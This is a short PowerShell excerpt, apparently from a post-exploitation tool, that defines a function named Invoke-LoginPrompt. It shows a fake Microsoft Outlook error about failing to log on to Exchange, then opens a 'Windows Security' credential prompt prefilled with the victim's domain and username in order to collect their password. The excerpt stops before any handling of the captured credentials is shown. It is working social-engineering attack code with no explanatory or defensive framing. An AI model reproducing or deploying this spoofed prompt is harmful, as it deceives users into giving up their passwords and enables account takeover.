...
function Invoke-LoginPrompt{
    ...
    [System.Windows.Forms.MessageBox]::Show("Outlook cannot log on to the Exchange Server.  Verify you are connected to the network and are using the proper server and mailbox name. The Microsoft Exchange information service in your profile is missing information required to authenticate. Modify your profile to ensure that you are using the correct Microsoft Exchange information service.","Microsoft Outlook",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)

    $cred = $Host.ui.PromptForCredential("Windows Security", "Please enter your username", "$env:userdomain\$env:username","")
